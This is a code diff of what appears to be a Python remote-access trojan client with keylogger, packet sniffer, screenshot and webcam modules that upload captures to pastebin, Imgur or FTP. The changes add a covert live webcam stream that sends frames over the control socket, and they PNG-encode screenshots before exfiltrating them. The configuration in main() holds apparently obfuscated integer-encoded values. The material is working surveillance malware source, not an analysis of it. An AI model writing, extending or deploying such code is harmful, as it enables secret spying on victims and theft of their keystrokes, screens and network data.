@@ -115,35 +115,37 @@ class Client(object):
 
     def _png(self, image):
         try:
-            if type(image) == np.ndarray:
+            if type(image) == numpy.ndarray:
                 width, height = (image.shape[1], image.shape[0])
                 data = image.tobytes()
             else:
                 width, height = (image.width, image.height)
                 data = image.rgb
         except:
-            return 'Input data type must be one of the following: {}'.format(''.join('\n\t{}'.format(i) for i in [np.ndarray, mss.screenshot.ScreenShot]))
-        line = width * 3
-        png_filter = struct.pack('>B', 0)
-        scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
-        magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
-        ihdr = [b'', b'IHDR', b'', b'']
-        ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
-        ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
-        ihdr[0] = struct.pack('>I', len(ihdr[2]))
-        idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
-        idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
-        idat[0] = struct.pack('>I', len(idat[2]))
-        iend = [b'', b'IEND', b'', b'']
-        iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
-        iend[0] = struct.pack('>I', len(iend[2]))
-        fileh = cStringIO.StringIO()
-        fileh.write(magic)
-        fileh.write(b''.join(ihdr))
-        fileh.write(b''.join(idat))
-        fileh.write(b''.join(iend))
-        return fileh
-
+            return "Input data type must be one of the following: 'numpy.ndarray','mss.screenshot'"
+        try:
+            line = width * 3
+            png_filter = struct.pack('>B', 0)
+            scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
+            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+            ihdr = [b'', b'IHDR', b'', b'']
+            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
+            ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
+            ihdr[0] = struct.pack('>I', len(ihdr[2]))
+            idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
+            idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
+            idat[0] = struct.pack('>I', len(idat[2]))
+            iend = [b'', b'IEND', b'', b'']
+            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
+            iend[0] = struct.pack('>I', len(iend[2]))
+            fileh = cStringIO.StringIO()
+            fileh.write(magic)
+            fileh.write(b''.join(ihdr))
+            fileh.write(b''.join(idat))
+            fileh.write(b''.join(iend))
+            return fileh
+        except Exception as e:
+            return str(e)
 
     def _command(fx, cx=__command__, mx=__modules__):
         fx.status = threading.Event()
@@ -153,7 +155,6 @@ class Client(object):
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
-                cx.update({fx.func_name: fx})
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
             fx.options   = {'max_bytes': 1024, 'upload': 'pastebin'}
@@ -162,14 +163,12 @@ class Client(object):
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
-                cx.update({fx.func_name: fx})
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
             fx.options   = {'image': True, 'video': bool(), 'upload': 'imgur'}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
-                cx.update({fx.func_name: fx})
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
             fx.options   = {'duration': 300.0, 'upload': 'ftp'}
@@ -177,13 +176,11 @@ class Client(object):
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
-                cx.update({fx.func_name: fx})
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
-                cx.update({fx.func_name: fx})
         elif fx.func_name is 'upload':
             fx.options   = {'pastebin': {'api_key': None}, 'imgur': {'api_key': None}, 'ftp': {'host': None, 'username': None, 'password': None}}
             fx.status.set()
@@ -302,6 +299,11 @@ class Client(object):
         return self._options(x) if x else self._options()
 
     @_command
+    def stream(self, x=None):
+        """live stream client webcam"""
+        return self._webcam_stream(int(x)) if str(x).isdigit() else self._webcam_stream()
+
+    @_command
     def status(self):
         """\tget client session status"""
         return self._status(time.clock())
@@ -323,7 +325,7 @@ class Client(object):
 
     @_command
     def webcam(self):
-        """\tcapture webcam - upload optionsS Imgur, FTP"""
+        """\tcapture webcam - upload options: Imgur, FTP"""
         return self._webcam()
     
     @_command
@@ -372,6 +374,7 @@ class Client(object):
     cd.usage		= 'cd <path>'
     new.usage		= 'new <url>'
     cat.usage		= 'cat <file>'
+    stream.usage        = 'stream <max>'
     set.usage		= 'set <cmd> x=y'
     help.usage		= 'help <option>'
     show.usage		= 'show <option>'
@@ -420,7 +423,8 @@ class Client(object):
     def _screenshot(self):
         with mss() as screen:
             img = screen.grab(screen.monitors[0])
-        result = self._upload_imgur(img)
+        png = self._png(img)
+        result = self._upload_imgur(png)
         self._result['screenshot'][time.ctime()] = result
         return result
 
@@ -984,6 +988,20 @@ class Client(object):
             result = 'Upload error: {}'.format(str(e))
         return result
 
+    def _webcam_stream(self, limit=10):
+        dev = VideoCapture(0)
+        end = time.time() + limit
+        try:
+            while True:
+                ret,frame=dev.read()
+                data = pickle.dumps(frame)
+                self._socket.sendall(struct.pack("L", len(data))+data)
+                if time.time() > end:
+                    break
+        finally:
+            dev.release()
+        return 'Streaming complete'
+
     def _webcam_video(self, duration=5.0):
         if str(self.webcam.options['upload']).lower() == 'ftp':
             try:
@@ -1344,7 +1362,7 @@ def main(*args, **kwargs):
             "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
             "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
             "__v__": "12620",
-	    "__w__": "12095051301478169748777225282050429328988589300942044190524178883912990436509786",
+	    "__w__": "12095051301478169748777225282050429328988589300942044190524177815713142069688900",
             "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
             "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
     }
